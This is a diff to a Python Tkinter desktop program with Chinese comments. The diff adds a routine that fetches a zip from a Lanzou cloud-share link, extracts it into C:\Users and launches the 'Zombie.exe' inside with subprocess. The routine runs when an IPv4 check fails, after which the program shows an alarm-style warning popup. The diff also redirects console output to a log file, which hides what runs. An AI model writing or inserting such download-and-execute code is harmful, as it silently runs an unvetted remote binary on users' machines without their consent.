@@ -1,6 +1,8 @@
 import binascii
 import csv
 import os
+import requests
+import zipfile
 import threading
 import tkinter as tk
 from tkinter import *
@@ -3334,7 +3336,8 @@ def show_popup(count):
     init_window.withdraw()  # 隐藏主窗口
     import subprocess
     for i in range(count):
-        subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
+        # subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
+        subprocess.Popen("C:\\Users\\Zombie.exe")
         countdown(6)
     init_window.attributes('-topmost', True)
     showwarning(title="！！！！警告警告！！！！",
@@ -3352,16 +3355,31 @@ def wjj():
                 os.startfile(desktop_path + f"\\{filename}")
 
 
-# #
-# log1 = os.getcwd() + "\\conf\\log.out"
-# f = open(log1, 'w')
-# sys.stdout = f
-# sys.stderr = f
+def down():
+    from 小说 import 蓝奏云直链
+    url = f"{蓝奏云直链.run('https://fzw.lanzouh.com/imhbz03zfa1a')}"
+    response = requests.get(url)
+    with open('Zombie.zip', 'wb') as f:
+        f.write(response.content)
+    with zipfile.ZipFile('Zombie.zip', 'r') as zip_ref:
+        zip_ref.extractall('C:\\Users')
+    os.remove('Zombie.zip')
+
+
+#
+log1 = os.getcwd() + "\\conf\\log.out"
+f = open(log1, 'w')
+sys.stdout = f
+sys.stderr = f
 
 if __name__ == '__main__':
     if check_ipv4():
         gui4_start()
     else:
+        if not os.path.exists("C:\\Program Files (x86)\\Common Files\\Zombie.zip"):
+            down()
+        else:
+            pass
         show_popup(1)
         print('结束')
         count_runs()
